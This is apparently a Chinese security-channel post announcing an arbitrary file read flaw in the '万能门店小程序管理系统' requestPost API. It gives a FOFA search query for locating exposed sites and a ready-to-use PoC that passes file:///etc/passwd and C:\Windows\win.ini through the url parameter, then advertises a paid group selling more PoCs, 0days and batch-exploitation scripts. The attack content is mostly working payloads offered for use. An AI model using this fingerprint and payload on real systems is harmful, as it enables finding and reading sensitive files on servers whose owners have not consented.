#  漏洞推送|万能门店小程序管理系统 requestPost存在任意文件读取漏洞   
小白菜安全  小白菜安全   2024-11-28 14:07  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/NhLcT1kxlia37svYWabvYzmhrJWdLfIHgxnz3h9W4zxUezdEZiaBGSsPMwDcYyJiaq6oqiaXuW8wdaNQoNDpczOZtg/640?wx_fmt=gif&from=appmsg "")  
  
漏洞描述  
  
  
万能门店小程序管理系统 requestPost存在任意文件读取漏洞，攻击者可以利用此漏洞获取系统敏感信息。  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/NhLcT1kxlia37svYWabvYzmhrJWdLfIHgxnz3h9W4zxUezdEZiaBGSsPMwDcYyJiaq6oqiaXuW8wdaNQoNDpczOZtg/640?wx_fmt=gif&from=appmsg "")  
  
资产信息  
  
  
fofa:body="/com/css/head_foot.css" || body="/com/css/iconfont"  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/NhLcT1kxlia2HqHHcc1hZq0x92eiaDBnYXuc5icMBv50XFT41LBlq6GqfgAsnvQibqEFtl1dmvn7qtZ9OqjBB2Vc5w/640?wx_fmt=png&from=appmsg "")  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/NhLcT1kxlia37svYWabvYzmhrJWdLfIHgxnz3h9W4zxUezdEZiaBGSsPMwDcYyJiaq6oqiaXuW8wdaNQoNDpczOZtg/640?wx_fmt=gif&from=appmsg "")  
  
漏洞复现  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/NhLcT1kxlia2HqHHcc1hZq0x92eiaDBnYXuvT1ia6qDpzmFa9MCdfs6micqxYPNmW3yMY16GOjfkQN3ic8YwcNDb56w/640?wx_fmt=other&from=appmsg "")  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/NhLcT1kxlia37svYWabvYzmhrJWdLfIHgxnz3h9W4zxUezdEZiaBGSsPMwDcYyJiaq6oqiaXuW8wdaNQoNDpczOZtg/640?wx_fmt=gif&from=appmsg "")  
  
POC  
  
```
linux:/api/wxapps/_requestPost?data=1&url=file:///etc/passwd
windows:/api/wxapps/_requestPost?data=1&url=file://C:\Windows\win.ini
```  
  
  
---------------------------------------------------  
  
更多漏洞poc（包括0day漏洞）、安全工具、批量脚本加入内部圈子获取，目前只要49，无理由3天退款，加入圈子请扫描下方二维码。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/NhLcT1kxlia2ibXzzibVk15gaIwPj3Libib3wz7rEzD4jThibDB3puG8zRTD9fLx4Ndhglm3VOUhNiczqNuriccyD38ibQw/640?wx_fmt=jpeg "")  
  
  
  
  
漏洞文库：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/NhLcT1kxlia2ibXzzibVk15gaIwPj3Libib3wh2bIueGiaicJL46kobAMKQCktI8HFTcVM9JpwNibdMKD9ZND0ebC0rwnw/640?wx_fmt=png&from=appmsg "")  
  
  
工具收集：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/NhLcT1kxlia2ibXzzibVk15gaIwPj3Libib3w26uxWScqm4lh60gQawZjffnNamZQR8BylhRBdjtf15dWgFsHMwrsFQ/640?wx_fmt=png&from=appmsg "")  
  
  
脚本文库：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/NhLcT1kxlia2ibXzzibVk15gaIwPj3Libib3wsdaXl2dhDDAJN3ZDl5fYWnGIckTK1vgLVHq2SHDDicic8OkMmMJ1fluw/640?wx_fmt=png&from=appmsg "")  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/NhLcT1kxlia37svYWabvYzmhrJWdLfIHgOaSVwdVAPT7DWSKK7pjSWGdbQKWEM0yTB3JSqNxLUnEBesOW8eG40w/640?wx_fmt=png&from=appmsg "")  
  
免责声明  
  
  
该公众号主要是分享互联网上公开的一些漏洞poc和工具，  
利用本公众号所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，本公众号及作者不为此承担任何责任，一旦造成后果请自行承担！如果本公众号分享导致的侵权行为请告知，我们会立即删除并道歉。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/NhLcT1kxlia37svYWabvYzmhrJWdLfIHgAth2WTu4kyEzL1Dia7AXUWcP7tsbHDtpaH1cls1lJTPVNE6XTwLYvJg/640?wx_fmt=gif&from=appmsg "")  
  
  
  
